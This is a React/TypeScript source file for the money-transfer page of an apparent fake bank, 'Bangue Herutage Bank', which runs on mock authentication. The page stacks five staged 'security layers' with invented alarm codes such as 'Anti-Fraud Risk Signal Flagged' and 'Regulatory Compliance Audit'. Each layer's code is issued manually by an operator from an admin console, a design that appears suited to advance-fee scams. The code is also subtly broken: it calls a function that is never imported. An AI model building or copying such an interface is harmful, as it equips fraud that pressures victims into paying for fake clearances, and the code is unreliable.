import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useState } from "react";
import { useAuth } from "@/lib/mock-auth";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import { useCurrency } from "@/lib/currency";
import { toast } from "sonner";
import { Send, ShieldCheck, ArrowLeft, CheckCircle2, Copy, AlertTriangle, Clock, KeyRound } from "lucide-react";
import {
  TOTAL_OTP_STAGES,
  verifyTransferOtp,
  getTransferOtpSession,
  cancelTransferOtpSession,
  subscribeTransferOtp,
  isLayerCodeActive,
  clearActiveSession,
  getTransferClearance,
  getActiveTransferSession,
  beginPendingTransfer,
  declinePendingTransfer,
  markTransferClearedLocal,
  type TransferOtpSession,
} from "@/lib/transfer-otp";

export const Route = createFileRoute("/dashboard/transfer")({
  head: () => ({ meta: [{ title: "Transfer — Bangue Herutage Bank" }] }),
  component: TransferPage,
});

const COUNTRIES = [
  { code: "US", label: "United States", postalLabel: "ZIP code" },
  { code: "CH", label: "Switzerland", postalLabel: "Postal code" },
  { code: "GB", label: "United Kingdom", postalLabel: "Postcode" },
  { code: "CA", label: "Canada", postalLabel: "Postal code" },
  { code: "NG", label: "Nigeria", postalLabel: "Postal code" },
  { code: "DE", label: "Germany", postalLabel: "Postal code" },
  { code: "FR", label: "France", postalLabel: "Postal code" },
  { code: "OTHER", label: "Other", postalLabel: "Postal code" },
] as const;

interface LayerAlert {
  code: string;
  title: string;
  desc: string;
}

const LAYER_ALERTS: Record<number, LayerAlert> = {
  1: {
    code: "ERR-AUTH-101",
    title: "Multi-Factor Authentication Required",
    desc: "Transaction verification required. Enter the 6-digit authentication code issued by bank security for this transfer.",
  },
  2: {
    code: "ERR-SEC-401",
    title: "Secondary Authorization Required",
    desc: "Initial authorization check cleared. High-value transfer threshold triggered secondary compliance review. Enter the newly issued code.",
  },
  3: {
    code: "ERR-FRD-902",
    title: "Anti-Fraud Risk Signal Flagged",
    desc: "Automated risk protocol requires additional token validation for cross-institution routing. Input the re-issued 6-digit passcode.",
  },
  4: {
    code: "ERR-CMP-309",
    title: "Regulatory Compliance Audit",
    desc: "Security policy layer 4 verification active. Mandatory verification code will be issued by an authorized officer.",
  },
  5: {
    code: "ERR-CLR-105",
    title: "Final Settlement Authorization",
    desc: "Final clearance protocol initialized. Complete this final security checkpoint to execute fund transfer.",
  },
};

interface BankAddress {
  street: string;
  city: string;
  state: string;
  postalCode: string;
  country: typeof COUNTRIES[number]["code"];
}

interface TransferDraft {
  to: string;
  routingNumber: string;
  address: BankAddress;
  phone: string;
  amount: number;
  desc: string;
}

interface CompletedTransfer extends TransferDraft {
  id: string;
  timestamp: string;
}

const emptyAddress: BankAddress = { street: "", city: "", state: "", postalCode: "", country: "US" };

function generateRef() {
  return "TXN-" + Date.now().toString(36).toUpperCase();
}

function TransferPage() {
  const { user, updateBalance, refreshTransactions } = useAuth();
  const { currency, toggleCurrency, format, toUSD } = useCurrency();
  const nav = useNavigate();

  const [to, setTo] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [address, setAddress] = useState<BankAddress>(emptyAddress);
  const [phone, setPhone] = useState("");
  const [amount, setAmount] = useState("");
  const [desc, setDesc] = useState("");

  const [step, setStep] = useState<"form" | "otp" | "success">("form");
  const [draft, setDraft] = useState<TransferDraft | null>(null);
  const [completed, setCompleted] = useState<CompletedTransfer | null>(null);

  const [session, setSession] = useState<TransferOtpSession | null>(null);
  const [transferCleared, setTransferCleared] = useState(false);
  const [otpInput, setOtpInput] = useState("");
  const [otpError, setOtpError] = useState("");

  useEffect(() => {
    if (!user?.customerId) return;
    void (async () => {
      const cleared = await getTransferClearance(user.customerId);
      setTransferCleared(cleared);
      if (cleared) return;
      // Resume unfinished OTP at the next unverified layer (never re-ask verified ones)
      const active = await getActiveTransferSession(user.customerId);
      if (active && active.status === "pending" && Number(active.amount) > 0) {
        setSession(active);
        setDraft({
          to: active.to,
          routingNumber: "",
          address: { street: "", city: "", state: "", postalCode: "", country: "US" },
          phone: "",
          amount: Number(active.amount) || 0,
          desc: active.desc || "",
        });
        setStep("otp");
        setOtpInput("");
        setOtpError("");
        const st = active.stage || 1;
        const alert = LAYER_ALERTS[st];
        if (alert) {
          toast.info(`Resuming at security layer ${st}: [${alert.code}] ${alert.title}`, {
            duration: 6000,
          });
        }
      }
    })();
  }, [user?.customerId]);
  const [submitting, setSubmitting] = useState(false);
  const [starting, setStarting] = useState(false);

  const refreshSession = useCallback(async () => {
    if (!session?.id) return;
    const fresh = await getTransferOtpSession(session.id);
    if (fresh) setSession(fresh);
  }, [session?.id]);

  // Poll while waiting for admin-issued OTP
  useEffect(() => {
    if (step !== "otp" || !session?.id || session.status !== "pending") return;
    const tick = () => { void refreshSession(); };
    const id = window.setInterval(tick, 2500);
    const unsub = subscribeTransferOtp(tick);
    return () => {
      window.clearInterval(id);
      unsub();
    };
  }, [step, session?.id, session?.status, refreshSession]);

  if (!user) return null;

  const selectedCountry = COUNTRIES.find((c) => c.code === address.country)!;
  const otpStage = session?.stage ?? 1;
  const layerAlert = LAYER_ALERTS[otpStage] ?? LAYER_ALERTS[1];
  const codeIssued = isLayerCodeActive(session?.codes?.[otpStage - 1]);

  const setField = (field: keyof BankAddress) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setAddress((a) => ({ ...a, [field]: e.target.value }));

  const resetAll = async () => {
    if (session?.id && session.status === "pending") {
      await declinePendingTransfer(session.id);
      try { await refreshTransactions(); } catch { /* ignore */ }
      toast.message("Transfer marked incomplete — recorded in your history with the layer details.");
    }
    setTo(""); setRoutingNumber(""); setAddress(emptyAddress); setPhone(""); setAmount(""); setDesc("");
    setStep("form"); setDraft(null); setCompleted(null);
    setSession(null); setOtpInput(""); setOtpError("");
  };

  const requestOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    const entered = parseFloat(amount);
    if (!to || !entered || entered <= 0) return toast.error("Enter a valid recipient and amount");
    if (!routingNumber) return toast.error("Enter the recipient's routing number");
    if (!address.street || !address.city || !address.postalCode) return toast.error("Complete the recipient bank's address");
    if (!phone) return toast.error("Enter a contact phone number");
    const amtUsd = toUSD(entered);
    if (amtUsd > user.balance) return toast.error("Insufficient balance");

    setStarting(true);
    try {
      const draftData: TransferDraft = { to, routingNumber, address, phone, amount: amtUsd, desc };
      setDraft(draftData);

      // Already fully cleared once → transfer immediately, never ask OTP again
      if (transferCleared) {
        await updateBalance(amtUsd, `Transfer to ${to}${desc ? ` — ${desc}` : ""}`, "Debit");
        setCompleted({ ...draftData, id: generateRef(), timestamp: new Date().toISOString() });
        setStep("success");
        toast.success("Transfer completed");
        return;
      }

      const started = await beginPendingTransfer({
        customerId: user.customerId,
        customerName: `${user.firstName} ${user.lastName}`.trim(),
        customerEmail: user.email,
        accountNumber: user.accountNumber,
        to,
        amount: amtUsd,
        desc,
      });

      if (started.cleared) {
        markTransferClearedLocal(user.customerId);
        setTransferCleared(true);
        // Funds already moved on the backend — refresh local ledger only
        try {
          await refreshTransactions();
        } catch {
          /* ignore */
        }
        setCompleted({ ...draftData, id: generateRef(), timestamp: new Date().toISOString() });
        setStep("success");
        toast.success("Transfer completed");
        return;
      }

      if (!started.session) {
        toast.error("Could not start verification session");
        return;
      }

      setSession(started.session);
      setOtpInput("");
      setOtpError("");
      setStep("otp");

      const st = started.session.stage || 1;
      const alert = LAYER_ALERTS[st] ?? LAYER_ALERTS[1];
      if (started.resumed) {
        toast.info(`Continuing at layer ${st} — already verified layers stay cleared for all future transfers.`);
        toast.error(`[${alert.code}] ${alert.title}`);
      } else {
        toast.error(`[${alert.code}] ${alert.title}`);
        toast.info(
          "Pending transfer saved. Verified layers stay cleared; incomplete transfers show the layer error on your receipt.",
          { duration: 7000 },
        );
      }
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Transfer could not be started");
    } finally {
      setStarting(false);
    }
  };

  const confirmOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!draft || !session) return;

    setSubmitting(true);
    setOtpError("");
    try {
      const result = await verifyTransferOtp(session.id, otpInput);
      if (!result.ok) {
        setOtpError(result.error ?? "Invalid code");
        return;
      }

      if (result.completed) {
        markTransferClearedLocal(user.customerId);
        setTransferCleared(true);
        // Prefer server balance; fall back to local debit if offline mode
        try {
          await refreshTransactions();
        } catch {
          try {
            await updateBalance(draft.amount, `Transfer to ${draft.to}${draft.desc ? ` — ${draft.desc}` : ""}`, "Debit");
          } catch {
            /* ignore */
          }
        }
        setCompleted({ ...draft, id: generateRef(), timestamp: new Date().toISOString() });
        setSession(result.session ?? session);
        setStep("success");
        clearActiveSession();
        toast.success("All security layers cleared. Future transfers will not require OTP on this account.");
        return;
      }

      // Advanced to next layer — admin must issue a new code
      if (result.session) setSession(result.session);
      setOtpInput("");
      const nextStage = result.session?.stage ?? otpStage + 1;
      const alertForNext = LAYER_ALERTS[nextStage];
      if (alertForNext) {
        toast.error(`[${alertForNext.code}] ${alertForNext.title}`);
      }
      toast.info("Layer cleared. Awaiting the next authorization code from bank security.", { duration: 6000 });
    } finally {
      setSubmitting(false);
    }
  };

  const copyRef = () => {
    if (!completed) return;
    navigator.clipboard.writeText(completed.id);
    toast.success("Reference copied");
  };

  if (step === "success" && completed) {
    return (
      <div className="mx-auto max-w-md space-y-6 pb-2 md:pb-0">
        <Card className="overflow-hidden p-8 text-center">
          <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-success/15 text-success">
            <CheckCircle2 className="h-9 w-9" />
          </div>
          <h1 className="mt-5 text-2xl font-bold">Transfer complete</h1>
          <p className="mt-1 text-sm text-muted-foreground">
            {format(completed.amount)} was sent to account {completed.to}.
          </p>

          <div className="mt-6 space-y-2 rounded-xl bg-muted/60 p-4 text-left text-sm">
            <Row k="Reference" v={completed.id} mono />
            <Row k="Amount" v={format(completed.amount)} />
            <Row k="Recipient account" v={completed.to} />
            <Row k="Routing number" v={completed.routingNumber} />
            <Row k="Bank address" v={`${completed.address.street}, ${completed.address.city}${completed.address.state ? `, ${completed.address.state}` : ""} ${completed.address.postalCode}`} />
            <Row k="Phone" v={completed.phone} />
            {completed.desc && <Row k="Description" v={completed.desc} />}
            <Row k="Date" v={new Date(completed.timestamp).toLocaleString()} />
          </div>

          <div className="mt-6 flex flex-col gap-2 sm:flex-row">
            <Button variant="outline" className="flex-1" onClick={copyRef}>
              <Copy className="mr-2 h-4 w-4" /> Copy reference
            </Button>
            <Button className="flex-1 gradient-primary text-primary-foreground" onClick={() => void resetAll()}>
              New transfer
            </Button>
          </div>
          <button
            type="button"
            onClick={() => nav({ to: "/dashboard" })}
            className="mt-4 text-xs text-muted-foreground hover:text-foreground hover:underline"
          >
            Back to overview
          </button>
        </Card>
      </div>
    );
  }

  if (step === "otp" && draft && session) {
    return (
      <div className="mx-auto max-w-md space-y-6 pb-2 md:pb-0">
        <div>
          <h1 className="text-xl font-bold sm:text-2xl">Verify it's you</h1>
          <p className="mt-1 text-sm text-muted-foreground">
            Security layer {otpStage} of {TOTAL_OTP_STAGES}. Layers you already verified stay cleared permanently — they will never be asked again on this or any future transfer.
          </p>
        </div>

        {/* Progress — verified layers stay done */}
        <div className="flex items-center justify-center gap-2">
          {Array.from({ length: TOTAL_OTP_STAGES }).map((_, i) => {
            const n = i + 1;
            const done = n < otpStage || isLayerVerified(session.codes?.[i]);
            const current = n === otpStage && !done;
            return (
              <div
                key={i}
                title={done ? `Layer ${n} verified` : current ? `Layer ${n} current` : `Layer ${n}`}
                className={`flex h-7 w-7 items-center justify-center rounded-full text-[10px] font-bold transition-colors ${
                  done
                    ? "bg-success text-white"
                    : current
                      ? "bg-primary text-primary-foreground ring-2 ring-primary/30"
                      : "bg-muted text-muted-foreground"
                }`}
              >
                {done ? "✓" : n}
              </div>
            );
          })}
        </div>

        {layerAlert && (
          <div className="flex items-start gap-3 rounded-lg border border-destructive/50 bg-destructive/10 p-4 text-destructive animate-in fade-in slide-in-from-top-2">
            <AlertTriangle className="h-5 w-5 shrink-0 mt-0.5 text-destructive" />
            <div className="space-y-1 text-xs">
              <div className="flex items-center gap-2">
                <span className="rounded bg-destructive/20 px-1.5 py-0.5 font-mono text-[10px] font-bold tracking-wider">
                  {layerAlert.code}
                </span>
                <h4 className="font-semibold text-sm leading-none">{layerAlert.title}</h4>
              </div>
              <p className="leading-relaxed opacity-90 pt-0.5">{layerAlert.desc}</p>
            </div>
          </div>
        )}

        {/* Waiting vs code issued */}
        <Card className={`p-4 ${codeIssued ? "border-success/40 bg-success/5" : "border-amber-500/30 bg-amber-500/5"}`}>
          <div className="flex items-start gap-3 text-sm">
            {codeIssued ? (
              <KeyRound className="mt-0.5 h-4 w-4 shrink-0 text-success" />
            ) : (
              <Clock className="mt-0.5 h-4 w-4 shrink-0 animate-pulse text-amber-600" />
            )}
            <div>
              <div className="font-medium">
                {codeIssued
                  ? `Layer ${otpStage} code has been issued`
                  : `Awaiting authorization for layer ${otpStage}`}
              </div>
              <p className="mt-0.5 text-xs text-muted-foreground">
                {codeIssued
                  ? "Enter the code provided by bank security below."
                  : "An authorized officer must generate the verification code from the admin console before you can continue."}
              </p>
              <p className="mt-1 font-mono text-[10px] text-muted-foreground">Session {session.id}</p>
            </div>
          </div>
        </Card>

        <Card className="p-6">
          <div className="mb-4 flex items-center gap-3 rounded-lg bg-muted/60 p-3 text-xs text-muted-foreground">
            <ShieldCheck className="h-4 w-4 shrink-0 text-primary" />
            <div>
              Sending <span className="font-semibold text-foreground">{format(draft.amount)}</span> to account{" "}
              <span className="font-semibold text-foreground">{draft.to}</span>
            </div>
          </div>
          <form onSubmit={confirmOtp} className="space-y-4">
            <div>
              <Label>Verification code</Label>
              <Input
                value={otpInput}
                onChange={(e) => { setOtpInput(e.target.value.replace(/\D/g, "").slice(0, 6)); setOtpError(""); }}
                placeholder="6-digit code"
                inputMode="numeric"
                disabled={!codeIssued}
                className={`mt-1.5 text-center text-lg tracking-[0.5em] ${otpError ? "border-destructive focus-visible:ring-destructive" : ""}`}
              />
              {otpError && (
                <div className="mt-2 flex items-center gap-1.5 text-xs text-destructive">
                  <AlertTriangle className="h-3.5 w-3.5 shrink-0" />
                  <span>{otpError}</span>
                </div>
              )}
            </div>
            <Button
              type="submit"
              className="w-full gradient-primary text-primary-foreground"
              disabled={!codeIssued || otpInput.length !== 6 || submitting}
            >
              {submitting ? "Verifying…" : otpStage >= TOTAL_OTP_STAGES ? "Confirm and send" : "Verify layer"}
            </Button>
            <div className="flex items-center justify-between text-xs">
              <button type="button" onClick={() => void resetAll()} className="flex items-center gap-1 text-muted-foreground hover:text-foreground">
                <ArrowLeft className="h-3 w-3" /> Cancel transfer
              </button>
              <button type="button" onClick={() => void refreshSession()} className="text-primary hover:underline">
                Refresh status
              </button>
            </div>
          </form>
        </Card>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-2xl space-y-6 pb-2 md:pb-0">
      <div>
        <h1 className="text-2xl font-bold">Send money</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          {transferCleared
            ? "Security clearance is complete on this account — transfers no longer require OTP."
            : `Transfers require security layers until all ${TOTAL_OTP_STAGES} are verified once. Verified layers stay cleared permanently. Incomplete attempts appear in history with the layer error code.`}
        </p>
      </div>
      <Card className="p-6">
        <form onSubmit={requestOtp} className="space-y-4">
          <div>
            <Label>Recipient account number</Label>
            <Input value={to} onChange={(e) => setTo(e.target.value)} placeholder="10-digit account" className="mt-1.5" />
          </div>

          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <Label>Routing number</Label>
              <Input value={routingNumber} onChange={(e) => setRoutingNumber(e.target.value)} placeholder="9-digit routing number" className="mt-1.5" />
            </div>
            <div>
              <Label>Recipient phone number</Label>
              <Input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="+1 (555) 000-0000" className="mt-1.5" />
            </div>
          </div>

          <div className="space-y-3 rounded-xl border border-border/60 p-4">
            <div className="text-sm font-medium">Recipient bank address</div>

            <div>
              <Label>Country</Label>
              <Select value={address.country} onValueChange={(v) => setAddress((a) => ({ ...a, country: v as BankAddress["country"] }))}>
                <SelectTrigger className="mt-1.5"><SelectValue /></SelectTrigger>
                <SelectContent>
                  {COUNTRIES.map((c) => <SelectItem key={c.code} value={c.code}>{c.label}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>

            <div>
              <Label>Street address</Label>
              <Input value={address.street} onChange={setField("street")} placeholder="123 Bank Street" className="mt-1.5" />
            </div>

            <div className="grid gap-3 sm:grid-cols-3">
              <div className="sm:col-span-1">
                <Label>City</Label>
                <Input value={address.city} onChange={setField("city")} placeholder="City" className="mt-1.5" />
              </div>
              <div>
                <Label>State / Province</Label>
                <Input value={address.state} onChange={setField("state")} placeholder="Optional" className="mt-1.5" />
              </div>
              <div>
                <Label>{selectedCountry.postalLabel}</Label>
                <Input value={address.postalCode} onChange={setField("postalCode")} placeholder={selectedCountry.postalLabel} className="mt-1.5" />
              </div>
            </div>
          </div>

          <div>
            <Label>Amount ({currency})</Label>
            <Input type="number" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="mt-1.5" />
          </div>
          <div>
            <Label>Description</Label>
            <Textarea value={desc} onChange={(e) => setDesc(e.target.value)} placeholder="What's this for?" className="mt-1.5" />
          </div>

          <button
            type="button"
            onClick={toggleCurrency}
            className="w-full rounded-lg bg-muted/60 p-3 text-left text-xs text-muted-foreground transition-colors hover:bg-muted"
          >
            Available balance: <span className="font-semibold text-foreground">{format(user.balance)}</span>
            <span className="ml-2 underline decoration-dotted underline-offset-4">tap to view in {currency === "USD" ? "CHF" : "USD"}</span>
          </button>

          <Button type="submit" className="w-full gradient-primary text-primary-foreground" disabled={starting}>
            <Send className="mr-2 h-4 w-4" /> {starting ? "Starting…" : "Continue"}
          </Button>
        </form>
      </Card>
    </div>
  );
}

function Row({ k, v, mono }: { k: string; v: string; mono?: boolean }) {
  return (
    <div className="flex items-start justify-between gap-4 border-b border-border/60 py-1.5 last:border-0">
      <span className="shrink-0 text-muted-foreground">{k}</span>
      <span className={`text-right font-medium ${mono ? "font-mono" : ""}`}>{v}</span>
    </div>
  );
}
